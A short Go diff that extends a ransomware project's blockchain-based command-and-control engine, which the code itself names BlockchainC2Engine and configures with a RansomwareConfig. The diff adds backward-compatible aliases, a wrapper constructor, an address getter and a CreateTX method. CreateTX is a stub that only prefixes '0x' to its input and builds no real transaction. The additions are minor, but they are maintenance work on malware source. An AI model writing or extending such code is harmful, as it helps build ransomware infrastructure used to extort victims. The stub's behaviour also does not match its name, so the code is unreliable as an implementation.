@@ -68,6 +68,9 @@ var blockchainAPIs = []string{
 	"https://api.blockcypher.com/v1/btc/main",
 }
 
+// Backward-compatible aliases
+type BlockchainC2 = BlockchainC2Engine
+
 func NewBlockchainC2Engine(cfg *RansomwareConfig) *BlockchainC2Engine {
 	monKey := make([]byte, 32)
 	rand.Read(monKey)
@@ -78,6 +81,10 @@ func NewBlockchainC2Engine(cfg *RansomwareConfig) *BlockchainC2Engine {
 		ETHAddress:    generateETHAddress(),
 		MonitoringKey: monKey,
 	}
+}
+
+func NewBlockchainC2(cfg *RansomwareConfig) *BlockchainC2Engine {
+	return NewBlockchainC2Engine(cfg)
 }
 
 func generateBTCAddress() string {
@@ -431,6 +438,14 @@ func (bc *BlockchainC2Engine) GenerateNewAddress() (string, string) {
 	pubKey := sha256.Sum256(privKey)
 	addr := hex.EncodeToString(pubKey[:20])
 	return addr, hex.EncodeToString(privKey)
+}
+
+func (bc *BlockchainC2Engine) GetActiveAddress() string {
+	return bc.BTCAddress
+}
+
+func (bc *BlockchainC2Engine) CreateTX(opReturn string, amount float64) string {
+	return "0x" + opReturn
 }
 
 func (bc *BlockchainC2Engine) GetStatusJSON() string {
